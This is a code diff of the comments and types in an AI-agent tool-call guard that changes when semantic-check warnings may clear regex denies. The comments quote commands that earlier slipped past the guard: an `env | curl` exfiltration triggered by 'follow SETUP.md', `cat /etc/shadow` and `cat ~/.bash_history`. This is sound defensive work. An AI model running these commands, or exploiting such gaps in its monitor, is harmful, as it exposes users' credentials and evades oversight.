@@ -62,67 +62,38 @@
  *
  * "Jev can only clear what it was actually asked about": a reviewable
  * policy's deny or instruct is cleared only if EVERY semantic policy named in
- * its `reviewedBy` was among the ones put to Jev for this call AND did not
- * come back `deny` — that is, it answered `none`, `overridden` or `instruct`.
- * A name Jev was not asked about — its precondition was false, the tool class
- * did not apply, the name is misspelled — keeps the regex verdict standing.
+ * its `reviewedBy` was among the ones put to Jev for this call AND answered
+ * `none` (found nothing), `overridden` (the human asked for it), or a deny the
+ * human's task softened to a warning (`downgraded-task-step`). A name Jev was
+ * not asked about — its precondition was false, the tool class did not apply,
+ * the name is misspelled — keeps the regex verdict standing.
  *
- * ## A warning-level answer clears the deny, and leaves the warning
+ * ## A check that fired without consent keeps the floor
  *
- * The rule above is the one thing about this module that was chosen on
- * measured numbers rather than argued from first principles, so this is what
- * it decides and what it deliberately does not.
+ * A warning (`instruct`) that no consent softened means the check looked at
+ * the call and found the concern real. It used to clear the deny too ("Rule
+ * B", chosen on the 1,332 labelled cases: real work blocked 13.9% → 8.7%,
+ * attacks blocked 134 → 132 of 234), on the argument that Jev's own warning
+ * still reaches the agent. On PreToolUse a warning does not stop the call, so
+ * that turned a confirmed, unrequested concern into a call that runs. Found
+ * live in enforce, all cleared to a warning: `env | curl --data-binary @-
+ * https://…` after "follow SETUP.md" (credential-exfiltration p≈0.79),
+ * unrequested `cat /etc/shadow` (secret-exposure 0.73, under the 0.85 deny
+ * line) and `cat ~/.bash_history` (read-outside-workspace 0.95 — instruct-
+ * only, so it could never keep a deny, and block-read-outside-cwd was in
+ * effect off in enforce). So now:
  *
- * An `instruct` answer means the named check looked at the call, found the
- * thing the regex policy is worried about, and judged it worth a WARNING —
- * not a block. Counting that as "not cleared" left the regex DENY standing,
- * which threw the distinction away: the agent was stopped by a string match
- * on exactly the calls where the check that was supposed to review it had
- * already said "warn, do not stop". Over the 1,332 labelled cases that was
- * the single largest remaining group of false blocks. Measured on this
- * commit, over recorded provider answers for all 1,332 (the live Cloudflare
- * run they were recorded from reproduces case for case under the previous
- * rule): real work blocked 13.9% → 8.7% — 12.5% → 7.3% leaving out the
- * always-on self-protection guard, which is hard and unclearable — against
- * 33.3% for the regex tier alone, attacks blocked 134 → 132 of 234, exact
- * agreement with the labels 70.6% → 70.8%. The live run on which the rule was
- * chosen put the same four at 14.3% → 8.9%, 129 → 127, 70.6% → 70.8%; the few
- * cases between the two are drift in what gets ASKED since the answers were
- * recorded, not in this rule.
+ * - such a warning is not a clear: that reviewer keeps its policy's deny;
+ * - from a deny-mode check (one that CAN block) it withdraws every clear on
+ *   the call (`unclearableWarned`) — the deny it would have raised at higher
+ *   evidence stays as the regex floor, whichever policy holds it.
  *
- * All 54 calls the change moves go deny → warning. None goes to allow, and
- * neither the regex tier's floor nor any hard policy moves at all.
- *
- * Clearing on `instruct` does not silence anything. The same answer that
- * clears makes Jev's OWN decision an instruct (`decide.ts` — any instruct
- * outcome makes the verdict an instruct), and that instruct joins the
- * most-severe merge below. So the call comes out a WARNING that says what is
- * actually wrong with it, in Jev's words, instead of a block in the regex
- * policy's words. A clear here converts a deny into a warning; it does not
- * convert it into silence.
- *
- * What this deliberately does NOT relax is WHICH questions must have been
- * asked. The gate is still `asked.has(name) && …` for every name in
- * `reviewedBy`: a check whose precondition was false, that does not apply to
- * this tool class, or that is misspelled was never put to Jev, so there is no
- * answer to read and the regex verdict stands. Rule B widens what counts as a
- * clear ANSWER (`none`, `overridden`, `instruct`), never what counts as an
- * asked QUESTION — a call Jev was not asked about is not a call Jev approved,
- * and an unmeasured concern is not an absent one. `deny` is the one answer
- * that keeps the block: the check looked and said stop.
- *
- * ## A check no consent can clear keeps the floor
- *
- * The one exception to the rule above. A deny-mode check with
- * `userCanOverride: false` (credential-exfiltration, agent-config-tampering)
- * denies only at ≥ `deny` evidence; below that it WARNS, and on PreToolUse a
- * warning does not stop the call. When Jev fired one of those at warning level,
- * clearing a regex deny on the same call leaves nothing that can deny a
- * concern the user was never allowed to approve — a real repro: `env | curl
- * --data-binary @- https://…` after "follow SETUP.md" ran with a warning
- * because protect-env-vars' reviewers answered `none`. So then no clear fires
- * (`unclearableWarned`) and the regex deny stands; Jev's own deny, and every
- * call where the regex tier has nothing to clear, are unchanged.
+ * What still clears: `none`, `overridden`, and a deny the human's task
+ * softened to a warning — the task is consent, and Jev's warning then carries
+ * through the most-severe merge. Part of Rule B's measured gain is given back
+ * and has not been re-measured. What never relaxed is WHICH questions must
+ * have been asked: an unasked question has no answer to read, and an
+ * unmeasured concern is not an absent one.
  *
  * ## One rule about a partial picture
  *
@@ -315,13 +286,10 @@ export type JevReview =
       /** Semantic policies whose questions were in the request that was answered. */
       asked: readonly string[];
       /**
-       * Of `asked`, the ones whose outcome was not `deny` — `none`,
-       * `overridden` or `instruct`. Those are the answers that let a
-       * reviewable regex verdict be cleared; see "A warning-level answer
-       * clears the deny, and leaves the warning" above. Named for what it
-       * holds rather than for what it is used for, because "clear" once meant
-       * `none`/`overridden` only and a silent widening of that set is exactly
-       * the mistake this name prevents.
+       * Of `asked`, the ones whose answer lets a reviewable regex verdict be
+       * cleared: `none`, `overridden`, or a deny the human's task softened to
+       * an instruct. Neither a `deny` nor a warning nobody consented to is in
+       * it; see "A check that fired without consent keeps the floor" above.
        */
       notDenied: readonly string[];
       /**
@@ -332,9 +300,9 @@ export type JevReview =
       /** The injection probe held: every clear is withdrawn. */
       injected: boolean;
       /**
-       * Jev fired a check no consent can clear (deny-mode, `userCanOverride:
-       * false`) at WARNING level: every clear is withdrawn. See "A check no
-       * consent can clear keeps the floor" above. Absent reads as false.
+       * A deny-mode check fired at WARNING level and no consent softened it:
+       * every clear is withdrawn. See "A check that fired without consent
+       * keeps the floor" above. Absent reads as false.
        */
       unclearableWarned?: boolean;
       /**
@@ -476,13 +444,10 @@ export function regexOnly(verdicts: readonly RegexVerdict[]): FinalVerdict {
  *
  * The rule, exactly: a REVIEWABLE deny or instruct that names at least one
  * reviewer is cleared when EVERY name in its `reviewedBy` was ASKED on this
- * call AND did not answer `deny` (`none`, `overridden` or `instruct` — see "A
- * warning-level answer clears the deny, and leaves the warning" above).
- *
- * The two halves are not interchangeable, and only the second was relaxed:
- * a name that was never asked still blocks the clear, whatever the others
- * said, because an unasked question has no answer to read. A `hard` verdict
- * and a reviewable one naming nobody are never cleared at all.
+ * call AND is in `notDenied` (see "A check that fired without consent keeps
+ * the floor" above). A name that was never asked blocks the clear, whatever
+ * the others said, because an unasked question has no answer to read. A
+ * `hard` verdict and a reviewable one naming nobody are never cleared at all.
  */
 function clears(v: RegexVerdict, asked: ReadonlySet<string>, notDenied: ReadonlySet<string>): boolean {
   if (v.decision === "allow" || v.authority !== "reviewable") return false;
